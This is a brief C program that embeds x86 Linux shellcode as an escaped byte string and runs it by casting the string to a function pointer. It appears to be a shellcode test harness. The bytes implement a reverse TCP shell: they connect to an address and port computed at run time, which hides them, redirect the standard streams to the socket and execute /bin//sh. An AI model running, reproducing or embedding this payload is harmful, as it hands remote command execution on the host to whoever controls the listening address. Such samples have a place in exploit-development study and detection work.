
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xc1\xe0\x02\xc1\xe8\x04\xb0\x66\x31\xdb\xb3\x02\xbf\x7c\x31\x62\x11\x81\xc7\x44\x77\x66\x77\x89\x7c\x24\xfc\x66\xb9\xbc\xbb\x66\x81\xc1\x11\x11\x66\x81\xe9\xcc\x11\x66\x89\x4c\x24\xfa\x83\xec\x06\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x89\x54\x24\xfc\xc7\x44\x24\xf8\x6e\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x2f\x62\x69\x83\xec\x0c\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
;


int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
